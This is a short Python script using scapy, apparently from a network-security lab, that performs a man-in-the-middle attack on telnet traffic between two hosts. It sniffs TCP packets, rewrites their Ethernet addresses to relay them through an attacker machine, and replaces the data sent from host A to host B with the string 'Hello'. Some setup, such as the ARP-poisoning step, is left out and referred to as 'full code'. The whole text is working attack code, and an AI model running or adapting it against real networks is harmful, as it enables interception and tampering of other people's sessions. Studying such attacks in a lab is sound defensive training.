#!/usr/bin/env python3
from scapy.all import *

# ... imports, initialization of addresses and Step 1 (refer to full code) ...

def tcp_spoof_pkt_telnet(pkt):
    if pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[Ether].src != M_mac:
            if pkt[IP].src == A and pkt[IP].dst == B:
                print("From A to B")
                pkt[Ether].src = M_mac
                pkt[Ether].dst = B_mac

                # Handle and replace payload
                if pkt[TCP].payload:
                    try:
                        data = pkt[TCP].payload.load.decode("utf-8")
                        del pkt[TCP].payload
                        del pkt[TCP].chksum
                        pkt[TCP] /= 'Hello' 
                    except UnicodeDecodeError:
                        print("Payload not UTF-8 decodable")

                sendp(pkt, verbose=False)

            elif pkt[IP].src == B and pkt[IP].dst == A:
                print("From B to A")
                pkt[Ether].src = M_mac
                pkt[Ether].dst = A_mac
                sendp(pkt, verbose=False)  # Forward the original packet

# Step 4: Launch MITM attack
pkt = sniff(filter='tcp', prn=tcp_spoof_pkt_telnet)
